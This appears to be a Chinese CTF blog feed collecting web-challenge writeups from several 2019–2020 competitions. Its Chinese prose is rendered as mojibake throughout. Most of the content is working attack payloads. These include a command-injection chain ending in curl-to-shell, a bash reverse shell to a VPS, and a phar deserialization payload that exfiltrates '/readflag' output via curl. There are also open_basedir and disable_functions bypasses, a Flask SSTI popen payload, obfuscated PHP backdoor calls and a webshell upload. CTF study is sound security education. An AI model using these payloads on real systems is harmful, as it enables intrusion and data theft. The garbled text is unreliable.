<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br><span class="line">&gt;sh</span><br><span class="line">&gt;ba\</span><br><span class="line">&gt;\%7C\		##ä¸Šé¢ä¸‰é‡æ£€æµ‹çš„ç¬¬äºŒä¸ªè¿‡æ»¤äº†|,urlç¼–ç ä¸€ä¸‹å°±ğŸ‰‘ï¸</span><br><span class="line">&gt;0\</span><br><span class="line">&gt;18\</span><br><span class="line">&gt;5.\</span><br><span class="line">&gt;11\</span><br><span class="line">&gt;8.\</span><br><span class="line">&gt;14\</span><br><span class="line">&gt;7.\</span><br><span class="line">&gt;20\</span><br><span class="line">&gt;\%20\</span><br><span class="line">&gt;rl\</span><br><span class="line">&gt;cu\</span><br><span class="line">sh%20x</span><br><span class="line">sh%20g</span><br></pre></td></tr></table></figure>

<p>æŠŠ<code>payload1.txt</code>ä¸­é—´çš„IPæ¢æˆè‡ªå·±vpsçš„ï¼Œç„¶åæ”¾åå¼¹shell<code>bash -i &gt;&amp; /dev/tcp/vpsip/2333 0&gt;&amp;1</code><br>ç›‘å¬ç«¯å£ï¼Œ<code>cat /flag</code></p>
<h2><span id="php-uaf">PHP-UAF</span></h2><p>è€é¢˜äº†ï¼ˆç¬¬ä¸€æ¬¡å¥½åƒæ˜¯2019EISâ€”ezpassï¼‰ï¼Œç›´æ¥ä¸Šexpäº†<br>exp.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'open_ basedir'</span>, <span class="string">'/tmp'</span>);</span><br><span class="line">mkdir(<span class="string">'sub'</span>);</span><br><span class="line">chdir(<span class="string">'sub'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);</span><br><span class="line">pwn(<span class="string">"/readflag"</span>);</span><br><span class="line"><span class="comment">//https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</span></span><br><span class="line">(ä¸‹é¢å¤ªé•¿äº†å°±ä¸ç²˜è´´å‡ºæ¥äº†ï¼ŒäºŒè¿›åˆ¶ğŸ‘´å†™çš„å’±ä¹Ÿçœ‹ä¸æ‡‚</span><br></pre></td></tr></table></figure>

<h2><span id="webct">webct</span></h2><p>ç»™äº†ä¸€ä¸ªè¿œç¨‹mysqlçš„æœåŠ¡ï¼Œå’Œä¸Šä¼ <br><code>www.zip</code>æºç æ³„æ¼</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$a = <span class="keyword">new</span> Listfile(<span class="string">'/;/readflag; curl http://vpsip/`/readflag`'</span>);</span><br><span class="line">$b = <span class="keyword">new</span> Fileupload($a);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($b);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.jpg"</span>,<span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">"1.phar"</span>, <span class="string">"1.gif"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>rogue mysq server è§¦å‘â¼€ä¸‹<br><a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a><br>å°†filelistæ”¹ä¸ºç®—å¥½çš„<code>phar</code>è·¯å¾„</p>
<h2><span id="sqlcheckin">sqlcheckin</span></h2><p>æŸ¥çœ‹æºç ï¼Œç»™äº†éƒ¨åˆ†æºç ï¼Œ<code>PDO</code>æ³¨å…¥çš„è¯åªè§è¿‡å®½å­—èŠ‚</p>
<p><code>select * from users where username = &#39;admin&#39;-0-&#39;&#39;;</code></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1><span id="é«˜æ ¡æˆ˜ç–«ç½‘ç»œå®‰å…¨åˆ†äº«èµ›-éƒ¨åˆ†writeup">[é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›] éƒ¨åˆ†WriteUp</span></h1><p>[TOC]</p>
<!-- toc -->

<ul>
<li><a href="#å‰è¨€">å‰è¨€</a></li>
<li>]]>
    </summary>
    
      <category term="Web" scheme="/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Webæ‹Ÿæ€é˜²å¾¡é¢˜å‹åˆæ¢]]></title>
    <link href="/2020/02/17/Web%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E9%A2%98%E5%9E%8B%E5%88%9D%E6%8E%A2/"/>
    <id>/2020/02/17/Webæ‹Ÿæ€é˜²å¾¡é¢˜å‹åˆæ¢/</id>
    <published>2020-02-17T06:34:37.000Z</published>
    <updated>2020-02-17T15:38:58.730Z</updated>
    <content type="html"><![CDATA[<h1><span id="webæ‹Ÿæ€é˜²å¾¡é¢˜å‹åˆæ¢">Webæ‹Ÿæ€é˜²å¾¡é¢˜å‹åˆæ¢</span></h1><p><a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1/20288376?fr=aladdin" target="_blank" rel="noopener">ç½‘ç»œç©ºé—´æ‹Ÿæ€é˜²å¾¡</a></p>
<h2><span id="ä¾‹é¢˜">ä¾‹é¢˜</span></h2><h3><span id="2019_rctf-calcalcalc">2019_RCTF Calcalcalc</span></h3><p>é¢˜ç›®æè¿°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">We implemented a new-generation calculator here!</span><br><span class="line">With the guidance of Cyber Mimic Defense, we developed this absolutely safe calculator and nobody can break it. The expression will be calculated by three different backends to make sure that the result is absolutely correct.</span><br><span class="line">You can check the [source](https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/calcalcalc) code here.</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨äº†ä¸‰ç§åç«¯ï¼šnodejsã€phpã€python,æˆ‘ä»¬è¾“å…¥çš„å‚æ•°ï¼Œä¼šåˆ†åˆ«è¿›å…¥3ç§åç«¯è¿›è¡Œæ‰§è¡Œï¼Œå¦‚æœ3ç§åç«¯æœ€åçš„è¿”å›å€¼ä¸åŒï¼Œé‚£ä¹ˆåˆ™è®¤å®šä¸ºæ— æ•ˆï¼Œæ˜¾ç¤º<code>That&#39;s classified information. - Asahina Mikuru</code>ã€‚å¦‚æœè¿”å›å€¼ä¸€è‡´ï¼Œè®¤å®šä¸ºå®‰å…¨ï¼Œåˆ™å°†æ‰§è¡Œç»“æœè¿”å›ã€‚<br>é¢˜ç›®ç»™äº†æˆ‘ä»¬åç«¯æºç </p>
<h4><span id="python">python</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> bson</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __builtins__[<span class="string">'exec'</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate</span><span class="params">()</span>:</span></span><br><span class="line">    data = request.get_data()</span><br><span class="line">    expr = bson.BSON(data).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bson.BSON.encode(&#123;</span><br><span class="line">      <span class="string">"ret"</span>: str(eval(str(expr[<span class="string">'expression'</span>])))</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<h3><span id="2019_0ctf-114514calcalcalc">2019_0CTF 114514calcalcalc</span></h3><h3><span id="2019_de1ctf-9calc">2019_De1ctf 9calc</span></h3>]]></content>
    <summary type="html">
    <![CDATA[<h1><span id="webæ‹Ÿæ€é˜²å¾¡é¢˜å‹åˆæ¢">Webæ‹Ÿæ€é˜²å¾¡é¢˜å‹åˆæ¢</span></h1><p><a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%8B%9F%E6%]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[2019NCTF_Web_Wp]]></title>
    <link href="/2019/11/25/2019NCTF-Web-Wp/"/>
    <id>/2019/11/25/2019NCTF-Web-Wp/</id>
    <published>2019-11-25T10:22:10.000Z</published>
    <updated>2019-11-25T12:58:51.542Z</updated>
    <content type="html"><![CDATA[<h1><span id="2019nctf_web">2019NCTF_Web</span></h1><h2><span id="fake-xml-cookbook">Fake XML cookbook</span></h2><p>æŠ“åŒ…ï¼Œæ¨æµ‹<code>username</code>å¤„å¯èƒ½æœ‰XXEæ¼æ´<br>ï¼ˆå’ŒUNCTFæ–°æ˜Ÿèµ›å‰ç«¯ä¸€æ ·ï¼Œç›´æ¥æ‹¿payloadæ‰“<br><img src="/2019/11/25/2019NCTF-Web-Wp/2.png" alt><br>ç›´æ¥xxepauloadä¸Š<br><img src="/2019/11/25/2019NCTF-Web-Wp/1.png" alt></p>
<h2><span id="true-xml-cookbook">True XML cookbook</span></h2><p>å’Œç¬¬ä¸€é¢˜åŒä¸€ä¸ªåœ°æ–¹æœ‰<code>xxe</code>ï¼Œæ ¹ç›®å½•å’Œå…¶ä»–åœ°æ–¹ä¸‹æ‰¾ä¸åˆ°<code>flag</code>ã€‚ã€‚ã€‚ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯æ”¾åˆ°å†…ç½‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/proc/net/fib_trie  è·¯ç”±æ ‘</span><br><span class="line">/etc/hosts  linuxç³»ç»Ÿä¸­è´Ÿè´£ipåœ°å€ä¸åŸŸåå¿«é€Ÿè§£æçš„æ–‡ä»¶</span><br><span class="line">/proc/net/arp</span><br></pre></td></tr></table></figure>

<p>è´¼å¤šipæ²¡æ‰¾äº†</p>
<h2><span id="sqli">SQLi</span></h2><p>å’Œiæ˜¥ç§‹ç¬¬ä¸€å­£é‚£ä¸ªé¢˜ä¸€æ ·,åªä¸è¿‡é‚£ä¸ªæœ‰å›æ˜¾ï¼Œè¿™ä¸ªæ¢æˆ302è·³è½¬<br>å…·ä½“è§ä¸Šä¸Šä¸Šä¸Šä¸Šä¸Šä¸Šç¯‡æœ‰è„šæœ¬</p>
<h2><span id="easyphp">easyphp</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$string_1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$string_2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line">$cmd = $_GET[<span class="string">'q_w_q'</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'23333333'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2nd</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//3rd</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($cmd) &gt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"too long :("</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) === <span class="number">0</span> &amp;&amp; substr_count($query, <span class="string">'%5f'</span>) === <span class="number">0</span> )&#123;</span><br><span class="line">    $arr = explode(<span class="string">' '</span>, $cmd);</span><br><span class="line">    <span class="keyword">if</span>($arr[<span class="number">0</span>] !== <span class="string">'ls'</span> || $arr[<span class="number">0</span>] !== <span class="string">'pwd'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(substr_count($cmd, <span class="string">'cat'</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">            system($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'ban cat :) '</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'bad guy!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'nonono _ is bad'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="ç¬¬ä¸€å…³">ç¬¬ä¸€å…³</span></h3><p>ç”¨<code>%0a</code>ç»•è¿‡<code>preg_match</code></p>
<h3><span id="ç¬¬äºŒå…³">ç¬¬äºŒå…³</span></h3><p>ä¼ å…¥ä¸€ä¸ªæ•°å­—<code>str1</code>å†ä¼ å…¥ä»»æ„çš„å­—ç¬¦<code>str2</code>ï¼Œä¸¤ä¸ªå‚æ•°çš„md5è¦ä¸åŒï¼Œä¸¤ä¸ªå‚æ•°çš„md5å†ç»è¿‡<code>strtr()</code>å°†<code>c</code>æ›¿æ¢ä¸º<code>0</code>åï¼ˆå› ä¸ºmd5è‚¯å®šæ²¡æœ‰<code>xhp</code>è¿™ä¸‰ä¸ªå­—ç¬¦ï¼‰ï¼Œä¸¤ä¸ªmd5åˆç›¸åŒ<br>åˆ©ç”¨phpå¼±ç±»å‹ï¼Œ<code>0e</code>åœ¨phpé‡Œé¢æ˜¯ç§‘å­¦è®¡æ•°æ³•(<code>===</code>æ¯”è¾ƒä¸¤ä¸ªå˜é‡çš„å€¼å’Œç±»å‹ï¼›<code>==</code>æ¯”è¾ƒä¸¤ä¸ªå˜é‡çš„å€¼ï¼Œä¸æ¯”è¾ƒæ•°æ®ç±»å‹,å¦‚æœä¸¤è€…ç±»å‹ä¸åŒåˆ™ç±»å‹è½¬æ¢ä¹‹åå†å¯¹æ¯”<br><img src="/2019/11/25/2019NCTF-Web-Wp/10.png" alt><br><img src="/2019/11/25/2019NCTF-Web-Wp/9.png" alt><br><code>str1</code>æ‰¾ä¸€ä¸ªmd5å<code>0e</code>å¼€å¤´åé¢å­—æ¯åªæœ‰<code>c</code>çš„å€¼ï¼Œ<code>md5(&quot;2120624&quot;) ==&gt; &quot;0e85776838554cc1775842c212686416&quot;</code><br><code>str2</code>æ‰¾ä¸€ä¸ªmd5å<code>0e</code>å¼€å¤´çš„,åé¢å…¨æ˜¯æ•°å­—çš„å€¼ï¼Œ<code>s878926199a</code>(ç™¾åº¦0eå¼€å¤´çš„md5ï¼Œä¸€å †</p>
<h3><span id="ç¬¬ä¸‰å…³">ç¬¬ä¸‰å…³</span></h3><p>ä¹‹å‰å®‰æ’æœˆèµ›çš„ä¸€é“é¢˜ï¼Œ<code>å¥‡æ€ªçš„æé¾™ç‰¹æ€§</code>åœ¨GETè¯·æ±‚é‡Œ<code>.</code>æ˜¯æ¢æˆ<code>_</code>çš„<br>åˆ—ç›®å½•é™¤äº†<code>ls</code>è¿˜æœ‰<code>dir</code><br>è¯»å–æ–‡ä»¶é™¤äº†<code>cat</code>è¿˜æœ‰<code>moreã€lessã€headã€tail</code><br>é•¿åº¦é™åˆ¶ç”¨é€šé…ç¬¦<code>*</code>ç»•è¿‡<br>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://nctf2019.x1ct34m.com:60005/?num=23333%0a&amp;str1=2120624&amp;str2=QNKCDZO&amp;q.w.q=tail%20f*</span><br></pre></td></tr></table></figure>

<h2><span id="flask">flask</span></h2><p>sstiæ²¡æœ‰è¿‡æ»¤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:40007/&#123;&#123;&quot;&quot;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&apos;cat /fla*&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="flask_website">flask_website</span></h2><h2><span id="upload-your-shell">Upload your Shell</span></h2><p>æ‰¾åˆ°ä¸Šä¼ ç‚¹<br><img src="/2019/11/25/2019NCTF-Web-Wp/3.png" alt><br>æ–‡ä»¶ååŸºäºç™½åå•ï¼Œapacheè§£ææ¼æ´ç»•ä¸è¿‡ã€‚ã€‚<br>æ–‡ä»¶ä¸Šä¼ æ”¹æ–‡ä»¶å¤´å’Œç»•è¿‡<code>&lt;?</code><br><img src="/2019/11/25/2019NCTF-Web-Wp/4.png" alt><br>ç„¶åæ‰å‘ç°æœ‰æ–‡ä»¶åŒ…å«ï¼Œç›´æ¥å°†ä¸Šä¼ çš„å›¾ç‰‡åŒ…å«ï¼Œè§£ææˆphp<br>(æˆ‘è¿˜è¿äº†åŠå¤©èšå‰‘<br><img src="/2019/11/25/2019NCTF-Web-Wp/5.png" alt></p>
<h2><span id="simple_xss">simple_xss</span></h2><h2><span id="hacker_backdoor">hacker_backdoor</span></h2><p>inctfåŸé¢˜å˜›ï¼Œä¹‹å‰åšå®¢éƒ½æ²¡æ€ä¹ˆå¥½å¥½å†™<br>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:60004/?useful=./&amp;code=$x=ch.r;$d=va.$x(114).$x(95).dump;$g=glo.b;$d($g($x(47).$x(42)));</span><br><span class="line">http://nctf2019.x1ct34m.com:60004/?useful=./&amp;code=$a=p.r.o.c.(%a0^%ff).o.p.e.n;$a((%d0^%ff).r.e.a.d.F.l.a.g.(%c1^%ff).(%d0^%ff).t.m.p.(%d0^%ff).h=d.k.k,array(),$z);</span><br><span class="line">http://nctf2019.x1ct34m.com:60004/?useful=./&amp;code=$x=c.hr;$f=va.$x(114).$x(95).dump;$g=fil.e;$a=$x(47).tmp.$x(47).x;$f($g($a));</span><br></pre></td></tr></table></figure>

<h2><span id="replace">replace</span></h2><p>æŸ¥çœ‹<code>hint.php</code>,æç¤º<code>ä½¿ç”¨php5.6+bootstrapè¿›è¡Œå¼€å‘</code>,æ‰¾äº†ä¸€ä¼š<code>bootstrap</code>çš„æ¼æ´ï¼Œåªæœ‰xssã€‚ã€‚ã€‚<br>éšä¾¿å°è¯•äº†ä¸€ä¸‹å‘ç°å‘½ä»¤æ‰§è¡Œäº†ã€‚ã€‚<br><img src="/2019/11/25/2019NCTF-Web-Wp/8.png" alt><br>è¯»å–æ ¹ç›®å½•ä¸‹æ–‡ä»¶<br><img src="/2019/11/25/2019NCTF-Web-Wp/6.png" alt><br>å‘ç°æœ‰wafï¼Œè¿‡æ»¤äº†äº†<code>system `` &quot;&quot;</code>ç­‰<br><code>sub=phpinfo()1&amp;pat=1&amp;rep=print(file_get_contents(chr(46).chr(47).(index).chr(46).(php)))</code><br>ç”¨chr()å¯ä»¥é¿å…ç”¨å¼•å·<br><img src="/2019/11/25/2019NCTF-Web-Wp/7.png" alt></p>
<h2><span id="phar-matches-everything">phar matches everything</span></h2><p>æç¤º<code>I hate VIM.</code></p>
<h2><span id="è‚¯å®šæœ‰swpæ–‡ä»¶æ³„éœ²æºç æ²¡æ‰¾åˆ°">è‚¯å®šæœ‰<code>swp</code>æ–‡ä»¶ï¼Œæ³„éœ²æºç ï¼Œæ²¡æ‰¾åˆ°ã€‚ã€‚ã€‚</span></h2><h2><span id="å‹é“¾">å‹é“¾</span></h2><p>akäº†Webé¢˜å¤§å¸ˆå‚…çš„<a href="https://nikoeurus.github.io/2019/11/25/2019NJUPTctf-wp/" target="_blank" rel="noopener">åšå®¢</a><br>ï¼ˆ<a href="http://dkk.ink/about/" target="_blank" rel="noopener">å‹é“¾é›†åˆ</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1><span id="2019nctf_web">2019NCTF_Web</span></h1><h2><span id="fake-xml-cookbook">Fake XML cookbook</span></h2><p>æŠ“åŒ…ï¼Œæ¨æµ‹<code>username</co]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[2019EIS_Web]]></title>
    <link href="/2019/11/25/2019EIS-Web/"/>
    <id>/2019/11/25/2019EIS-Web/</id>
    <published>2019-11-25T04:20:41.000Z</published>
    <updated>2019-12-04T11:19:20.428Z</updated>
    <content type="html"><![CDATA[<h1><span id="2019å®‰å…¨è¿ç»´æŒ‘æˆ˜èµ›web_wp">2019å®‰å…¨è¿ç»´æŒ‘æˆ˜èµ›Web_Wp</span></h1><p>[TOC]</p>
<h2><span id="ezbypass">ezbypass</span></h2><p><img src="/2019/11/25/2019EIS-Web/1.png" alt><br>æŸ¥çœ‹phpinfo<code>http://111.186.57.61:10101/?src=&amp;cmd=phpinfo();</code><br>å‘ç°è®¾ç½®äº†<code>open_basedir</code>:<code>/var/www/html/:/tmp</code><br>ç»•è¿‡<code>open_basedir</code>åº·åº·flagåœ¨å“ª</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://111.186.57.61:10101/?cmd=mkdir(&apos;/tmp/fuck&apos;);chdir(&apos;/tmp/fuck&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);var_dump(scandir(&apos;/&apos;));</span><br><span class="line">æˆ–è€…ç”¨glob</span><br><span class="line">http://111.186.57.61:10101/?cmd=$a=&quot;glob:///*&quot;;if($b=opendir($a) ) &#123; while ( ($file = readdir($b)) !== false ) &#123; echo &quot;filename:&quot;.$file.&quot;\n&quot;; &#125;closedir($b); &#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸ª<code>flag</code>å’Œ<code>/readflag</code>è®©æˆ‘ä»¬æ‰§è¡Œ<code>/readflag</code>æ¥è¯»flag<br>å¸¸è§çš„æ‰§è¡Œç³»ç»Ÿå‡½æ•°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>

<p>å…¨éƒ¨ç¦ç”¨äº†ï¼Œé‚£å°±åªèƒ½ç»•<code>disable_functions</code>ä½†æ˜¯æˆ‘æ²¡é‡è§è¿‡ï¼Œåœ¨<code>/tmp</code>çœ‹åˆ°äº†ä»–ä»¬çš„payloadï¼Œé¡ºä¾¿è°·æ­Œäº†ä¸€ä¸‹ä¸‹<br><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a><br>æœ€åinclude /tmpä¸‹æ–‡ä»¶<br><code>http://111.186.57.61:10101/?cmd=include(%22/tmp/a12.php%22);</code></p>
